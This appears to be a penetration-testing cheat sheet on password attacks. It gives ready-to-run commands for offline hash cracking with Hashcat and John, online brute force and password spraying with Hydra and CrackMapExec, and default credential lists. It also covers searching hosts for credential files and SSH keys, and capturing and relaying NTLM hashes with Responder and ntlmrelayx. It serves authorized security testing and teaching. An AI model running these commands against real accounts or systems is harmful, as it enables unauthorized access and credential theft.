---
title: "Password Attacks"
---

# Password Attacks

Password attacks span from offline hash cracking to online service brute force. The approach depends on what was found: hash dumps call for Hashcat, live services call for Hydra or CrackMapExec.

## Hash Identification

Before cracking, identify the hash type:

```bash
# hashid
hashid '<hash>'
hashid '$2y$10$AbCdEfGhIjKlMnOpQrStUuVwXyZ012345678901234567890'

# hash-identifier
hash-identifier

# Example hash formats
# MD5:    32 hex chars: 5f4dcc3b5aa765d61d8327deb882cf99
# SHA1:   40 hex chars: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
# SHA256: 64 hex chars
# NTLM:   32 hex chars (same length as MD5, but different)
# bcrypt: $2y$ or $2b$ prefix
# sha512crypt: $6$ prefix
# sha256crypt: $5$ prefix
```

## Hashcat

### Hash Modes

```bash
# Common modes
-m 0     # MD5
-m 100   # SHA1
-m 1000  # NTLM
-m 1800  # sha512crypt ($6$)
-m 3200  # bcrypt ($2*$)
-m 5600  # NetNTLMv2
-m 13100 # Kerberoast (TGS-REP)
-m 18200 # AS-REP Roast
-m 22000 # WPA-PBKDF2-PMKID+EAPOL
```

### Attack Modes

```bash
# Dictionary attack
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (most effective)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Combination attack (wordlist1 + wordlist2)
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt

# Brute force (mask)
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l  # 8 lowercase chars
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a  # 8 any chars

# Mask characters
# ?l = lowercase [a-z]
# ?u = uppercase [A-Z]
# ?d = digits [0-9]
# ?s = special chars
# ?a = all printable

# Show cracked passwords
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show

# Custom charset
hashcat -m 0 hash.txt -a 3 -1 ?l?d ?1?1?1?1?1?1
```

### Common Hashcat Commands

```bash
# NTLM hashes from secretsdump
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NetNTLMv2 from Responder
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt

# Kerberoast tickets
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AS-REP Roast
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## John the Ripper

```bash
# Auto-detect format
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Specify format
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john hash.txt --show

# /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow

# Zip password
zip2john archive.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# PDF password
pdf2john document.pdf > pdf.hash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt

# SSH private key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# KeePass
keepass2john database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Online Brute Force

### Hydra

```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# HTTP POST login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin/

# RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<IP>

# SMB
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<IP>

# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>

# SMTP
hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt smtp://<IP>
```

### CrackMapExec: Password Spray

```bash
# SMB password spray (avoid lockout: test one password across all users)
crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success

# Single user, multiple passwords
crackmapexec smb <IP> -u administrator -p passwords.txt

# Check valid credentials
crackmapexec smb <IP> -u administrator -p 'Password123'
crackmapexec smb <IP>/24 -u administrator -p 'Password123'  # Spray whole subnet

# Domain password spray
crackmapexec smb <IP> -u users.txt -p 'Summer2024!' -d DOMAIN --continue-on-success
```

## Default Credentials

Always try default credentials before brute forcing:

```
admin:admin
admin:password
admin:1234
admin:(blank)
root:root
root:toor
administrator:administrator
guest:guest

# Service-specific
tomcat:s3cret           # Tomcat Manager
jenkins:jenkins         # Jenkins
admin:admin123          # Various
sa:(blank)              # MSSQL
postgres:postgres       # PostgreSQL
```

Resources:
- https://github.com/ihebski/DefaultCreds-cheat-sheet
- `creds get <service>` from DefaultCreds tool

## Credential Extraction from Files

After gaining access, look for credentials in common locations:

```bash
# Linux: configuration files
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.php" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name ".env" 2>/dev/null

# Database config files
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /etc/mysql/my.cnf

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Windows: credential locations
type C:\Windows\System32\drivers\etc\hosts
type C:\inetpub\wwwroot\web.config
dir /s /b C:\*.config 2>nul | findstr /i "database connection"
```

## Wordlist Generation

### CeWL: Custom Wordlists from Websites

```bash
# Crawl target site and extract words
cewl http://target.com -m 6 -d 2 -w custom_wordlist.txt

# With authentication
cewl http://target.com -m 6 -d 2 -w custom_wordlist.txt --auth_type basic --auth_user admin --auth_pass password
```

### Crunch: Pattern-based Generation

```bash
# 8-character passwords: uppercase + lowercase + digits
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Pattern: Company2024! style
crunch 11 11 -t Target@@@@

# Based on a known pattern
crunch 8 8 -t ????2024  # 4 unknown chars + 2024
```

### Mentalist / CUPP: Targeted Wordlist

```bash
# CUPP: user info based wordlist
python3 cupp.py -i
# Enter known info: name, birthdate, partner name, pet name, etc.
```

## NTLM Hash Relay and Capture

### Responder: Capture Hashes

```bash
# Start Responder on Kali
sudo responder -I eth0 -wrf

# Force NTLM auth from target
# Trigger by: UNC paths, phishing, LLMNR/NBT-NS poisoning

# Captured hashes in /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
```

### NTLMRelayX: Relay Attack

```bash
# Relay instead of capturing (requires SMB signing disabled)
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive shell on relay
ntlmrelayx.py -tf targets.txt -smb2support -i

# Execute command on relay
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
